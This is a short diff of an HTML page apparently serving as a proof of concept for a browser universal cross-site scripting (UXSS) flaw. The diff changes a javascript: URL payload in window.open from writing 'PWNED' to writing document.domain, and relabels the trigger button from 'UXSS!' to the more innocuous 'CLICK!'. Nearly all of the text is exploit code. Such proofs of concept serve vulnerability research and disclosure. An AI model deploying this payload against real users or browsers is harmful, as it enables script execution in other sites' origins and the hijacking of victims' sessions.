@@ -1,9 +1,9 @@
 <script>
 function a(){
-  window.open("javascript:document.write('<h1>PWNED</h1>')", "x");
+	window.open('javascript:document.write(document.domain)', 'x');
 	setTimeout(function(){
 		window.open('');
 	}, 500000);
 }
 </script> 
-<center><input type="button" class="button" value="UXSS!" onclick="a()"></center>
+<center><input type="button" class="button" value="CLICK!" onclick="a()"></center>
